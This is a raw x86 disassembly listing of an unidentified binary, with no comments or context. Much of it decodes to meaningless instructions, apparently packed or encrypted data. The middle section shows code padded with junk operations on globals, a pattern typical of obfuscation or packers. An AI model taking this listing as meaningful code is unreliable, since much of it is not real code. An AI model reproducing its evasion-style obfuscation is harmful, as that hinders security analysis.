  404bb5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404bb6:	and    DWORD PTR [ecx-0x2e917c9a],0xb46b3d6a
  404bc0:	sub    BYTE PTR [ebx-0x8],ch
  404bc3:	call   0x61fda1bd
  404bc8:	add    DWORD PTR [ecx],esi
  404bca:	adc    DWORD PTR [edx-0x9],ecx
  404bcd:	add    eax,ecx
  404bcf:	xchg   ebx,eax
  404bd0:	pop    esi
  404bd1:	sbb    DWORD PTR [edx-0x1b],esi
  404bd4:	jae    0x404b8b
  404bd6:	test   DWORD PTR [eax-0x30],esi
  404bd9:	inc    edi
  404bda:	scas   al,BYTE PTR es:[edi]
  404bdb:	or     al,BYTE PTR [ecx+0x4c]
  404bde:	test   al,0x9c
  404be0:	xlat   BYTE PTR ds:[ebx]
  404be1:	call   0xb0a0:0xe3047705
  404be8:	scas   al,BYTE PTR es:[edi]
  404be9:	xor    ecx,DWORD PTR [ecx]
  404beb:	cwde   
  404bec:	xchg   ecx,eax
  404bed:	add    cl,BYTE PTR [esi+eax*2]
  404bf0:	adc    al,0x95
  404bf2:	mov    al,ds:0xf6a24b94
  404bf7:	xor    BYTE PTR [edi-0x4e4d4c98],al
  404bfd:	(bad)  [edi-0x26190155]
  404c03:	out    0xf8,al
  404c05:	jb     0x404c42
  404c07:	adc    BYTE PTR [eax],al
  404c09:	rcl    cl,cl
  404c0b:	mov    bl,0x15
  404c0d:	xchg   BYTE PTR [edx],cl
  404c0f:	dec    ecx
  404c10:	jns    0x404c43
  404c12:	cli    
  404c13:	cli    
  404c14:	int3   
  404c15:	and    eax,0x33153a82
  404c1a:	push   eax
  404c1b:	inc    edx
  404c1c:	push   cs
  404c1d:	xor    cl,BYTE PTR [eax-0x3a1f4959]
  404c23:	push   ebx
  404c24:	pop    esi
  404c25:	jle    0x404bfa
  404c27:	or     esi,DWORD PTR [edi+0x6ae29509]
  404c2d:	sbb    eax,DWORD PTR [eax-0x76]
  404c30:	jno    0x404cb0
  404c32:	stos   DWORD PTR es:[edi],eax
  404c33:	fild   DWORD PTR [esi]
  404c35:	mov    esi,0x76e5fdfa
  404c3a:	sahf   
  404c3b:	out    dx,eax
  404c3c:	repz aaa 
  404c3e:	sub    eax,0x9a3ebf67
  404c43:	jb     0x404c52
  404c45:	dec    ebx
  404c46:	push   ecx
  404c47:	aad    0xb6
  404c49:	(bad)  
  404c4a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404c4b:	jg     0x404c0f
  404c4d:	mov    ss,WORD PTR [esi]
  404c4f:	pop    ebp
  404c50:	dec    ecx
  404c51:	das    
  404c52:	es sub al,0x8e
  404c55:	add    al,0x9b
  404c57:	add    BYTE PTR [eax-0x3c1ae977],0x98
  404c5e:	sbb    eax,0x7acf859c
  404c63:	stos   BYTE PTR es:[edi],al
  404c64:	je     0x404c04
  404c66:	dec    esp
  404c67:	cdq    
  404c68:	je     0x404c0d
  404c6a:	push   eax
  404c6b:	imul   ecx,DWORD PTR [eax],0xfc73b1ce
  404c71:	das    
  404c72:	xchg   edi,eax
  404c73:	jmp    0x404c0b
  404c75:	mov    ecx,0x5e28c639
  404c7a:	stos   BYTE PTR es:[edi],al
  404c7b:	mov    bl,0x31
  404c7d:	in     eax,dx
  404c7e:	inc    edi
  404c7f:	fistp  WORD PTR [ecx]
  404c81:	rcr    BYTE PTR [ebp+0x8e3a777],cl
  404c87:	jo     0x404c89
  404c89:	ret    0xda6b
  404c8c:	(bad)  
  404c8d:	dec    esi
  404c8e:	scas   al,BYTE PTR es:[edi]
  404c8f:	push   edx
  404c90:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404c91:	xchg   esp,eax
  404c92:	pop    ecx
  404c93:	jb     0x404c84
  404c95:	sbb    esi,DWORD PTR [ebx]
  404c97:	push   ds
  404c98:	push   esi
  404c99:	call   0x8bed5fee
  404c9e:	jns    0x404ce7
  404ca0:	dec    edi
  404ca1:	je     0x404c52
  404ca3:	test   BYTE PTR [esi],bl
  404ca5:	xchg   edi,eax
  404ca6:	out    dx,eax
  404ca7:	adc    DWORD PTR [eax+0x660d2f2a],edx
  404cad:	mov    bh,0x39
  404caf:	pop    ebp
  404cb0:	outs   dx,DWORD PTR ds:[esi]
  404cb1:	add    eax,0x74cf60dc
  404cb6:	inc    eax
  404cb7:	mov    bh,0x8f
  404cb9:	shl    DWORD PTR [ebx-0x1a],0xa7
  404cbd:	bound  ebp,QWORD PTR [edi-0x1a]
  404cc0:	sbb    bl,BYTE PTR [edx]
  404cc2:	xchg   ebx,eax
  404cc3:	mov    ecx,ecx
  404cc5:	sbb    BYTE PTR [ecx+0x6424fc3],ah
  404ccb:	push   esp
  404ccc:	sub    ah,BYTE PTR [esi]
  404cce:	lea    esi,[ebx-0x3e]
  404cd1:	loope  0x404c97
  404cd3:	popf   
  404cd4:	enter  0x6324,0xe8
  404cd8:	retf   0x6dc4
  404cdb:	cmp    ah,BYTE PTR [edx-0x348ac4af]
  404ce1:	mov    ecx,0x209098e0
  404ce6:	mov    cl,0xdd
  404ce8:	pop    esi
  404ce9:	push   ebp
  404cea:	into   
  404ceb:	mov    al,0x75
  404ced:	in     al,dx
  404cee:	mov    ch,0x8c
  404cf0:	js     0x404cc6
  404cf2:	es pop esi
  404cf4:	mov    bl,0x49
  404cf6:	or     al,0x63
  404cf8:	sbb    BYTE PTR [esi+0x55],bh
  404cfb:	jg     0x404d63
  404cfd:	lods   eax,DWORD PTR ds:[esi]
  404cfe:	test   dh,cl
  404d00:	int    0x4f
  404d02:	jb     0x404ca3
  404d04:	lea    ebp,[edx+edi*2-0x2fa30ef1]
  404d0b:	mov    eax,0xd5e786a1
  404d10:	push   esi
  404d11:	cld    
  404d12:	jns    0x404d90
  404d14:	inc    esp
  404d15:	mov    ah,0xe6
  404d17:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404d18:	mov    ds:0x2ef40be2,eax
  404d1d:	mov    DWORD PTR [ebp+0x7608645b],ebp
  404d23:	in     eax,0x3d
  404d25:	fldcw  WORD PTR [ebx-0x222a4507]
  404d2b:	jns    0x404cd8
  404d2d:	inc    ecx
  404d2e:	inc    ebx
  404d2f:	sub    BYTE PTR [eax-0x2d],bl
  404d32:	dec    eax
  404d33:	inc    ebp
  404d34:	push   ebx
  404d35:	(bad)  
  404d36:	(bad)  
  404d37:	je     0x404d8e
  404d39:	jae    0x404d5f
  404d3b:	into   
  404d3c:	mov    al,0x84
  404d3e:	icebp  
  404d3f:	push   0x234bdd02
  404d44:	repz lock mov edx,esp
  404d48:	sahf   
  404d49:	sahf   
  404d4a:	jg     0x404d19
  404d4c:	dec    esi
  404d4d:	jp     0x404d75
  404d4f:	sub    eax,0xa4f7005d
  404d54:	xchg   esi,eax
  404d55:	arpl   WORD PTR [edi+0x1],di
  404d58:	mov    bl,ah
  404d5a:	out    dx,eax
  404d5b:	xor    BYTE PTR [esp+esi*8-0x58],0x40
  404d60:	sub    BYTE PTR [ebx-0x13385bd0],al
  404d66:	mov    bl,0x81
  404d68:	sub    al,0xbb
  404d6a:	mov    ch,0x4c
  404d6c:	nop
  404d6d:	(bad)  
  404d6e:	loopne 0x404d3b
  404d70:	dec    edi
  404d71:	retf   0x5cda
  404d74:	(bad)  
  404d75:	xor    esi,DWORD PTR [edx]
  404d77:	pop    ebx
  404d78:	cmp    DWORD PTR [eax+0x25],0xfd2ed00b
  404d7f:	test   DWORD PTR [esi-0x360f14dc],0x29e0d5e
  404d89:	lods   al,BYTE PTR ds:[esi]
  404d8a:	sbb    eax,0x9a1ff30f
  404d8f:	out    0x9b,al
  404d91:	call   0xe87ac0b5
  404d96:	retf   
  404d97:	cmp    eax,0x3c6e9c92
  404d9c:	lds    esp,FWORD PTR [esi]
  404d9e:	sar    ebx,0x46
  404da1:	push   ebx
  404da2:	mov    eax,ds:0x3a0dc5d3
  404da7:	mov    ?,WORD PTR [edx-0x7c]
  404daa:	pop    es
  404dab:	dec    eax
  404dac:	cmp    ecx,ebp
  404dae:	push   0xb03c9e18
  404db3:	out    0x6f,al
  404db5:	cwde   
  404db6:	inc    esp
  404db7:	inc    esp
  404db8:	push   esi
  404db9:	add    eax,0x323327bf
  404dbe:	pop    es
  404dbf:	push   ebx
  404dc0:	xchg   ebx,eax
  404dc1:	pop    es
  404dc2:	inc    edx
  404dc3:	(bad)  
  404dc4:	lock jmp 0x3f09:0xb36b3321
  404dcc:	jns    0x404da9
  404dce:	enter  0xc6ee,0xa6
  404dd2:	add    al,0x7b
  404dd4:	sbb    edi,esp
  404dd6:	inc    edx
  404dd7:	ins    BYTE PTR es:[edi],dx
  404dd8:	das    
  404dd9:	fsubr  DWORD PTR [ebp+0x2b]
  404ddc:	xchg   BYTE PTR [edx+0xb],cl
  404ddf:	pop    esp
  404de0:	mov    edi,0x86894fdf
  404de5:	push   eax
  404de6:	add    al,0xcb
  404de8:	pop    eax
  404de9:	sub    ebx,DWORD PTR [eax+0x2c]
  404dec:	sub    eax,0xc5c81370
  404df1:	jne    0x404d93
  404df3:	mov    al,ds:0x6880b375
  404df8:	enter  0xad55,0x44
  404dfc:	xor    eax,0x6af9ab48
  404e01:	nop
  404e02:	pop    ebp
  404e03:	les    esi,FWORD PTR [edi+0x4e]
  404e06:	es cdq 
  404e08:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404e09:	imul   esp,ebx,0x6e
  404e0c:	xor    ebp,DWORD PTR [edx+0x72e62f66]
  404e12:	aam    0x83
  404e14:	mov    esi,0x5ba63a61
  404e19:	mov    dh,0x2b
  404e1b:	rcr    BYTE PTR [ecx-0x24d40cb5],cl
  404e21:	gs aas 
  404e23:	sub    eax,DWORD PTR [eax+0x4cd182fd]
  404e29:	cs shl dl,0x16
  404e2d:	ds (bad) 
  404e2f:	mov    eax,0xca6787af
  404e34:	inc    ebp
  404e35:	inc    eax
  404e36:	lods   al,BYTE PTR ds:[esi]
  404e37:	dec    esp
  404e38:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404e39:	test   eax,0x27430172
  404e3e:	push   es
  404e3f:	xchg   ebx,eax
  404e40:	icebp  
  404e41:	sti    
  404e42:	push   0x23
  404e44:	cmp    ebp,edx
  404e46:	jb     0x404e9d
  404e48:	(bad)
  404e4b:	sub    BYTE PTR [edx],cl
  404e4d:	add    cl,dh
  404e4f:	scas   eax,DWORD PTR es:[edi]
  404e50:	test   DWORD PTR [esp+ebp*1+0x4b],ebp
  404e54:	sti    
  404e55:	repnz sub ebp,DWORD PTR [eax+0x625cab56]
  404e5c:	push   ebp
  404e5d:	jmp    0x404e58
  404e5f:	aad    0x4f
  404e61:	sub    DWORD PTR [edi+ebp*4+0x5f7a4ec9],edx
  404e68:	fwait
  404e69:	sub    eax,0xc76354df
  404e6e:	xor    dl,BYTE PTR [esi-0xb827abd]
  404e74:	inc    ebx
  404e75:	cmp    BYTE PTR ds:[ecx+0xc],dh
  404e79:	cdq    
  404e7a:	add    BYTE PTR [esi-0x24120304],ch
  404e80:	add    BYTE PTR [ebp+0x1c],bh
  404e83:	bound  eax,QWORD PTR [esp+ebx*1+0x7525df93]
  404e8a:	(bad)  
  404e8b:	sub    ah,dh
  404e8d:	imul   esi,DWORD PTR [ebx],0xb93e90a8
  404e93:	clc    
  404e94:	sub    dl,BYTE PTR [eax]
  404e96:	cld    
  404e97:	(bad)  
  404e98:	imul   ebx,DWORD PTR [ebx+eax*1+0x7c],0x71e3ae85
  404ea0:	in     eax,dx
  404ea1:	icebp  
  404ea2:	push   0x977dce8
  404ea7:	(bad)  [eax+ebx*2]
  404eaa:	cmp    DWORD PTR [ecx],edi
  404eac:	add    ah,0xa4
  404eaf:	lea    ecx,[ebx+ecx*8-0x4d]
  404eb3:	in     eax,0x68
  404eb5:	adc    ecx,ebx
  404eb7:	cld    
  404eb8:	pop    ss
  404eb9:	cli    
  404eba:	lods   al,BYTE PTR ds:[esi]
  404ebb:	push   0x3c498f3b
  404ec0:	mov    edx,DWORD PTR [eax+0x42]
  404ec3:	jmp    DWORD PTR [eax+0x676f8808]
  404ec9:	call   0x47063cb8
  404ece:	lods   al,BYTE PTR ds:[esi]
  404ecf:	stos   DWORD PTR es:[edi],eax
  404ed0:	je     0x404e8c
  404ed2:	mov    cl,0x9a
  404ed4:	sbb    ecx,esp
  404ed6:	mov    al,ds:0xdd53f047
  404edb:	cmp    DWORD PTR [ecx+0x6e97ee04],esp
  404ee1:	cs add eax,0x97bf23e4
  404ee7:	xchg   al,ch
  404ee9:	pop    edx
  404eea:	xchg   ebp,eax
  404eeb:	neg    ebx
  404eed:	inc    esp
  404eee:	bound  ebx,QWORD PTR [edi+0x6]
  404ef1:	dec    ebx
  404ef2:	ret    0x3f15
  404ef5:	mov    ds:0x46b9ab57,al
  404efa:	xchg   BYTE PTR [ecx-0x5],dl
  404efd:	mov    eax,ds:0xd7c555cd
  404f02:	clc    
  404f03:	aaa    
  404f04:	push   ss
  404f05:	add    BYTE PTR [ecx-0x10],cl
  404f08:	xor    cl,BYTE PTR [ebx+ecx*8-0x5c4699bd]
  404f0f:	stc    
  404f10:	jne    0x404efc
  404f12:	ja     0x404f0e
  404f14:	push   0x52d5c4cb
  404f19:	cwde   
  404f1a:	jae    0x404ef9
  404f1c:	and    DWORD PTR [esi],esi
  404f1e:	outs   dx,BYTE PTR ds:[esi]
  404f1f:	and    eax,0x8c663186
  404f24:	mov    ds:0xeab7922b,al
  404f29:	fs mov edi,0xe4550bef
  404f2f:	sbb    DWORD PTR ds:0x42826b,0x7456
  404f39:	shl    ecx,0x1e
  404f3c:	lea    ecx,[edx+eax*1]
  404f3f:	adc    edx,DWORD PTR ds:0x428277
  404f45:	mov    eax,DWORD PTR [ebx]
  404f47:	or     DWORD PTR ds:0x42838b,edi
  404f4d:	mov    edx,DWORD PTR [ebx+0x4]
  404f50:	mov    DWORD PTR ds:0x428367,0x1480
  404f5a:	shrd   eax,edx,0x2
  404f5e:	adc    DWORD PTR ds:0x428373,0x1a3a
  404f68:	shr    edx,0x2
  404f6b:	cmp    DWORD PTR ds:0x428373,0x0
  404f72:	mov    DWORD PTR ds:0x428303,ebx
  404f78:	mov    DWORD PTR ds:0x42837b,0x56b3
  404f82:	mov    DWORD PTR ds:0x42825b,0x1c7d
  404f8c:	jmp    0x405004
  404f91:	mov    DWORD PTR ds:0x42822f,ebx
  404f97:	mov    DWORD PTR ds:0x428267,0x5683
  404fa1:	cmp    DWORD PTR ds:0x428373,0x0
  404fa8:	jg     0x404fd2
  404fae:	push   0x428f
  404fb3:	push   DWORD PTR [ebp-0x14]
  404fb6:	call   DWORD PTR ds:0x428d7c
  404fbc:	and    edx,DWORD PTR ds:0x428313
  404fc2:	sub    DWORD PTR ds:0x42823f,ecx
  404fc8:	or     DWORD PTR ds:0x428233,0xf0b
  404fd2:	adc    DWORD PTR ds:0x42816f,0x4903
  404fdc:	mov    edx,DWORD PTR ds:0x428353
  404fe2:	mov    edx,DWORD PTR [edx]
  404fe4:	add    DWORD PTR ds:0x42815b,edx
  404fea:	xor    edx,edx
  404fec:	xor    edx,DWORD PTR ds:0x428153
  404ff2:	xor    DWORD PTR ds:0x428293,edx
  404ff8:	mov    edx,DWORD PTR ds:0x428267
  404ffe:	add    DWORD PTR ds:0x42838b,edx
  405004:	mov    DWORD PTR [ebp-0x1c],eax
  405007:	mov    eax,ds:0x428293
  40500c:	add    DWORD PTR ds:0x42826b,eax
  405012:	mov    eax,DWORD PTR [ebx]
  405014:	sub    edx,0x532
  40501a:	mov    edx,DWORD PTR [ebx+0x4]
  40501d:	xor    DWORD PTR [ebp-0x1c],edi
  405020:	mov    edx,eax
  405022:	xor    eax,eax
  405024:	add    DWORD PTR ds:0x428373,0x32cc
  40502e:	or     eax,DWORD PTR [ebp-0x1c]
  405031:	sub    DWORD PTR ds:0x42837f,0x1679
  40503b:	shl    edx,0x1e
  40503e:	and    DWORD PTR ds:0x428167,edi
  405044:	imul   eax,ecx
  405047:	mov    ecx,DWORD PTR [ebx]
  405049:	mov    edx,DWORD PTR [ebx+0x4]
  40504c:	shrd   ecx,edx,0x2
  405050:	sbb    DWORD PTR ds:0x42838f,0x5de1
  40505a:	mov    DWORD PTR [ebp-0x1c],ecx
  40505d:	sbb    DWORD PTR ds:0x42827f,0x3a7c
  405067:	mov    ecx,DWORD PTR [ebx]
  405069:	adc    DWORD PTR ds:0x428173,0x428257
  405073:	xor    DWORD PTR [ebp-0x1c],edi
  405076:	shr    edx,0x2
  405079:	adc    DWORD PTR ds:0x42836b,ecx
  40507f:	mov    edx,DWORD PTR [ebx+0x4]
  405082:	mov    edx,ecx
  405084:	xor    ecx,ecx
  405086:	mov    DWORD PTR ds:0x42837b,0x321a
  405090:	or     ecx,DWORD PTR [ebp-0x1c]
  405093:	adc    DWORD PTR ds:0x42826b,0x428377
  40509d:	shl    edx,0x1e
  4050a0:	or     DWORD PTR ds:0x428263,0x428283
  4050aa:	sub    ecx,eax
  4050ac:	mov    eax,DWORD PTR [ebp-0xc]
  4050af:	mov    DWORD PTR ds:0x428237,0x7aa6
  4050b9:	cmp    DWORD PTR [eax],ecx
  4050bb:	not    eax
  4050bd:	mov    eax,DWORD PTR [ebp-0xc]
  4050c0:	mov    DWORD PTR ds:0x42836b,0x460d
  4050ca:	jg     0x405287
  4050d0:	mov    ecx,DWORD PTR [ebp+0x18]
  4050d3:	xor    DWORD PTR ds:0x42837b,edx
  4050d9:	mov    edx,DWORD PTR [ebp+0x1c]
  4050dc:	sbb    DWORD PTR ds:0x428387,0x42822b
  4050e6:	shrd   ecx,edx,0x2
  4050ea:	sbb    DWORD PTR ds:0x428253,0x42823f
  4050f4:	mov    DWORD PTR [ebp-0x1c],ecx
  4050f7:	mov    ecx,DWORD PTR [ebp+0x18]
  4050fa:	xor    DWORD PTR [ebp-0x1c],edi
  4050fd:	or     DWORD PTR ds:0x42828f,0x2ce0
  405107:	shl    ecx,0x1e
  40510a:	xor    ecx,ecx
  40510c:	and    DWORD PTR ds:0x42826f,0x42824b
  405116:	or     ecx,DWORD PTR [ebp-0x1c]
  405119:	shr    edx,0x2
  40511c:	or     DWORD PTR ds:0x428157,ebx
  405122:	mov    edx,DWORD PTR [ebp+0x1c]
  405125:	mov    DWORD PTR [ebp-0x2c],ecx
  405128:	cmp    DWORD PTR ds:0x42837b,0x0
  40512f:	mov    DWORD PTR ds:0x42818b,edx
  405135:	mov    DWORD PTR ds:0x42835b,ecx
  40513b:	not    edx
  40513d:	jmp    0x405212
  405142:	mov    DWORD PTR ds:0x42816b,0x795c
  40514c:	cmp    DWORD PTR ds:0x42837b,0x0
  405153:	ja     0x40517c
  405159:	push   0x427f9c
  40515e:	push   DWORD PTR [ebp-0x24]
  405161:	push   0x6923
  405166:	call   DWORD PTR ds:0x428da4
  40516c:	or     DWORD PTR ds:0x428263,0xa87
  405176:	add    ecx,DWORD PTR ds:0x428397
  40517c:	adc    ecx,DWORD PTR ds:0x42817b
  405182:	xor    DWORD PTR ds:0x42816b,0x1a4f
  40518c:	sbb    DWORD PTR ds:0x42827f,edx
  405192:	cmp    DWORD PTR ds:0x4282db,0x0
  405199:	mov    DWORD PTR ds:0x428307,0x66a6
  4051a3:	mov    DWORD PTR ds:0x4282e7,ecx
  4051a9:	mov    ecx,0x67a4
  4051ae:	jmp    0x405212
  4051b3:	mov    edx,0x2152
  4051b8:	cmp    DWORD PTR ds:0x4282db,0x0
  4051bf:	jge    0x4051e9
  4051c5:	push   DWORD PTR [ebp-0x28]
  4051c8:	push   DWORD PTR [ebp-0x28]
  4051cb:	call   DWORD PTR ds:0x428da8
  4051d1:	inc    DWORD PTR ds:0x428277
  4051d7:	mov    ecx,DWORD PTR ds:0x4281b7
  4051dd:	mov    edx,DWORD PTR ds:0x4283b7
  4051e3:	sub    ecx,edx
  4051e5:	imul   ecx,DWORD PTR [ecx+edx*1]
  4051e9:	xor    DWORD PTR ds:0x4282db,0x4a74
  4051f3:	mov    edx,DWORD PTR ds:0x4281af
  4051f9:	mov    edx,DWORD PTR [edx]
  4051fb:	sub    DWORD PTR ds:0x428263,edx
  405201:	mov    edx,DWORD PTR ds:0x4281c7
  405207:	mov    ecx,DWORD PTR ds:0x4283b7
  40520d:	sub    ecx,edx
  40520f:	and    edx,DWORD PTR [edx+ecx*1]
  405212:	mov    ecx,DWORD PTR [ebx]
  405214:	sub    DWORD PTR ds:0x42836f,0x2089
  40521e:	mov    edx,DWORD PTR [ebx+0x4]
  405221:	shrd   ecx,edx,0x2
  405225:	shr    edx,0x2
  405228:	mov    DWORD PTR [ebp-0x1c],ecx
  40522b:	xor    edx,edx
  40522d:	xor    edx,DWORD PTR ds:0x42827f
  405233:	sub    DWORD PTR ds:0x428183,edx
  405239:	mov    ecx,DWORD PTR [ebx]
  40523b:	inc    edx
  40523c:	mov    edx,DWORD PTR [ebx+0x4]
  40523f:	add    DWORD PTR ds:0x42835b,0x35fe
  405249:	xor    DWORD PTR [ebp-0x1c],edi
  40524c:	xor    edx,edx
  40524e:	xor    DWORD PTR ds:0x428167,0x631d
  405258:	or     edx,DWORD PTR [ebp-0x1c]
  40525b:	xor    DWORD PTR ds:0x42826f,0x428173
  405265:	shl    ecx,0x1e
  405268:	and    DWORD PTR ds:0x42838b,0x428257
  405272:	imul   edx,DWORD PTR [ebp-0x2c]
  405276:	add    DWORD PTR ds:0x428383,0x4996
  405280:	sub    DWORD PTR [eax],edx
  405282:	jmp    0x4058d5
  405287:	add    DWORD PTR ds:0x42815b,0x42f2
  405291:	mov    ecx,DWORD PTR [esi]
  405293:	cmp    DWORD PTR ds:0x428293,0x0
  40529a:	mov    DWORD PTR ds:0x428223,0x7c0
  4052a4:	mov    edx,DWORD PTR ds:0x428263
  4052aa:	mov    DWORD PTR ds:0x4282eb,0x4c43
  4052b4:	jmp    0x405321
  4052b9:	mov    DWORD PTR ds:0x428393,0x6b40
  4052c3:	mov    DWORD PTR ds:0x42827b,0x2bfd
  4052cd:	cmp    DWORD PTR ds:0x428293,0x0
  4052d4:	jae    0x4052fc
  4052da:	push   0x428059
  4052df:	push   0x1ca9
  4052e4:	call   DWORD PTR ds:0x428dac
  4052ea:	add    edx,DWORD PTR ds:0x42824b
  4052f0:	adc    edx,0x1702
  4052f6:	add    edx,DWORD PTR ds:0x428173
  4052fc:	and    DWORD PTR ds:0x42817f,0x3bee
  405306:	dec    edx
  405307:	xor    edx,edx
  405309:	or     edx,DWORD PTR ds:0x428257
  40530f:	add    DWORD PTR ds:0x428293,edx
  405315:	mov    edx,DWORD PTR ds:0x42827b
  40531b:	add    DWORD PTR ds:0x428163,edx
  405321:	mov    edx,DWORD PTR [esi+0x4]
  405324:	xor    DWORD PTR ds:0x4282e7,0x42821f
  40532e:	shrd   ecx,edx,0x2
  405332:	mov    DWORD PTR [ebp-0x1c],ecx
  405335:	cmp    DWORD PTR ds:0x428303,0x0
  40533c:	mov    DWORD PTR ds:0x4282ff,edi
  405342:	mov    DWORD PTR ds:0x428267,ebx
  405348:	jmp    0x405426
  40534d:	mov    DWORD PTR ds:0x42830b,0x4d36
  405357:	mov    DWORD PTR ds:0x428387,0x1e95
  405361:	cmp    DWORD PTR ds:0x428303,0x0
  405368:	jb     0x405396
  40536e:	push   0x848f
  405373:	push   0x5d21
  405378:	call   DWORD PTR ds:0x428db0
  40537e:	not    ecx
  405380:	adc    DWORD PTR ds:0x42838f,ecx
  405386:	neg    ecx
  405388:	mov    ecx,DWORD PTR ds:0x4283cf
  40538e:	mov    ecx,DWORD PTR [ecx]
  405390:	sub    DWORD PTR ds:0x42836f,ecx
  405396:	mov    ecx,DWORD PTR ds:0x42823f
  40539c:	xor    DWORD PTR ds:0x42814b,ecx
  4053a2:	or     ecx,0x48b0
  4053a8:	sbb    DWORD PTR ds:0x42826b,edx
  4053ae:	cmp    DWORD PTR ds:0x4282eb,0x0
  4053b5:	mov    DWORD PTR ds:0x428157,edi
  4053bb:	not    DWORD PTR ds:0x42822b
  4053c1:	jmp    0x405426
  4053c6:	mov    DWORD PTR ds:0x428187,0xab0
  4053d0:	cmp    DWORD PTR ds:0x4282eb,0x0
  4053d7:	jb     0x405406
  4053dd:	push   0x56df
  4053e2:	push   DWORD PTR [ebp-0x20]
  4053e5:	push   DWORD PTR [ebp-0x20]
  4053e8:	push   0x14ed
  4053ed:	push   DWORD PTR [ebp-0x24]
  4053f0:	call   DWORD PTR ds:0x428db4
  4053f6:	sub    ecx,DWORD PTR ds:0x42818b
  4053fc:	sub    DWORD PTR ds:0x42822b,0x6432
  405406:	or     DWORD PTR ds:0x42824f,0x3285
  405410:	adc    ecx,DWORD PTR ds:0x42817f
  405416:	sub    DWORD PTR ds:0x428383,edi
  40541c:	mov    DWORD PTR ds:0x42822b,0x48f2
  405426:	mov    ecx,DWORD PTR [esi]
  405428:	xor    DWORD PTR [ebp-0x1c],edi
  40542b:	shl    ecx,0x1e
  40542e:	adc    DWORD PTR ds:0x428267,0xf0c
  405438:	xor    ecx,ecx
  40543a:	xor    DWORD PTR ds:0x4282df,0x1337
  405444:	or     ecx,DWORD PTR [ebp-0x1c]
  405447:	shr    edx,0x2
  40544a:	mov    edx,DWORD PTR ds:0x42838f
  405450:	sub    edx,DWORD PTR ds:0x428143
  405456:	mov    DWORD PTR ds:0x42838f,edx
  40545c:	jmp    0x40583a
  405461:	xchg   ecx,eax
  405462:	stc    
  405463:	xchg   ebp,eax
  405464:	out    dx,al
  405465:	ins    BYTE PTR es:[edi],dx
  405466:	push   0x6b
  405468:	jbe    0x405493
  40546a:	push   0x25
  40546c:	stos   BYTE PTR es:[edi],al
  40546d:	iret   
  40546e:	push   esp
  40546f:	add    ch,BYTE PTR [edx-0x1a]
  405472:	mov    ecx,0x129e1818
  405477:	sbb    BYTE PTR [eax],bl
  405479:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40547a:	in     al,dx
  40547b:	(bad)  
  40547c:	sub    BYTE PTR ds:0x721e7818,dh
  405482:	jg     0x405462
  405484:	adc    ebx,0xffffffca
  405487:	adc    BYTE PTR [eax+esi*8-0x10],al
  40548b:	inc    edi
  40548c:	xor    BYTE PTR [eax+0x531fc4bb],cl
  405492:	int3   
  405493:	out    dx,al
  405494:	shl    DWORD PTR [edi+0x7b21e1bc],0xab
  40549b:	jle    0x405503
  40549d:	inc    edx
  40549e:	sub    edi,DWORD PTR [ecx]
  4054a0:	push   ecx
  4054a1:	jno    0x405507
  4054a3:	or     DWORD PTR [ebp-0x6b50323a],edx
  4054a9:	or     ebx,edi
  4054ab:	std    
  4054ac:	mov    dh,cl
  4054ae:	arpl   bx,sp
  4054b0:	dec    edi
  4054b1:	scas   al,BYTE PTR es:[edi]
  4054b2:	fcomp  DWORD PTR [ebp-0x73a49523]
  4054b8:	adc    ah,dh
  4054ba:	aad    0x20
  4054bc:	mov    dl,0x93
  4054be:	pop    edx
  4054bf:	dec    edx
  4054c0:	in     al,dx
  4054c1:	mov    edi,eax
  4054c3:	pcmpgtd mm5,mm0
  4054c6:	shl    dh,cl
  4054c8:	ins    BYTE PTR es:[edi],dx
  4054c9:	jns    0x4054e3
  4054cb:	iret   
  4054cc:	dec    esi
  4054cd:	lahf   
  4054ce:	cmp    al,0x13
  4054d0:	das    
  4054d1:	js     0x40554a
  4054d3:	push   edx
  4054d4:	or     ecx,DWORD PTR [edx-0x60b4928b]
  4054da:	test   DWORD PTR [edi+0x67be7534],esp
  4054e0:	mov    bh,0x3f
  4054e2:	les    esp,FWORD PTR [ebp-0x4b]
  4054e5:	mov    al,ds:0x9b4557c5
  4054ea:	cmp    BYTE PTR [ecx],bl
  4054ec:	ss jg  0x4054b3
  4054ef:	jle    0x405509
  4054f1:	data16 aas 
  4054f3:	pop    esp
  4054f4:	jbe    0x4054b3
  4054f6:	das    
  4054f7:	daa    
  4054f8:	mov    eax,0xbff2cb85
  4054fd:	mov    cl,0xa
  4054ff:	sub    eax,0x235d6f34
  405504:	(bad)  
  405506:	push   es
  405507:	add    BYTE PTR [esi+0x782ca914],0x1f
  40550e:	mov    eax,ds:0x76604b98
  405513:	push   ss
  405514:	cmp    eax,0x372360f3
  405519:	pop    ebp
  40551a:	mov    dh,0xc3
  40551c:	mov    ds:0xcd38c2dc,al
  405521:	scas   al,BYTE PTR es:[edi]
  405522:	inc    esi
  405523:	jle    0x405506
  405525:	pop    eax
  405526:	xchg   ebp,eax
  405527:	xchg   esp,eax
  405528:	mov    esi,0x5be3013f
  40552d:	loope  0x40554a
  40552f:	fisubr WORD PTR [edx+0x43cb6470]
  405535:	mov    ds:0x9fbdbdb9,al
  40553a:	push   ebx
  40553b:	(bad)  
  40553c:	push   ecx
  40553d:	or     al,0xc1
  40553f:	mov    BYTE PTR [esi-0x1c06f10c],bh
  405545:	jne    0x405525
  405547:	ret    0x5aed
  40554a:	adc    dh,BYTE PTR [ebx+0x6a]
  40554d:	inc    edx
  40554e:	pop    esp
  40554f:	and    esi,DWORD PTR [edi+0x599ced13]
  405555:	inc    esp
  405556:	add    eax,0x2235b928
  40555b:	mov    bl,0x47
  40555d:	sbb    DWORD PTR [ebx],esp
  40555f:	pop    esp
  405560:	imul   edi,DWORD PTR [edi],0xd6f0b0e0
  405566:	or     eax,0xc0107d25
  40556b:	in     eax,dx
  40556c:	mov    ah,0x2d
  40556e:	jmp    0xcd7a:0xd679253b
  405575:	fild   WORD PTR [edi-0x4870b3da]
  40557b:	imul   ecx,DWORD PTR [esi+esi*4+0x32],0xe3feb702
  405583:	mov    edx,0xa90eca8c
  405588:	stos   BYTE PTR es:[edi],al
  405589:	mov    BYTE PTR [ebx-0x73b640e2],bl
  40558f:	ds jecxz 0x405589
  405592:	aam    0x23
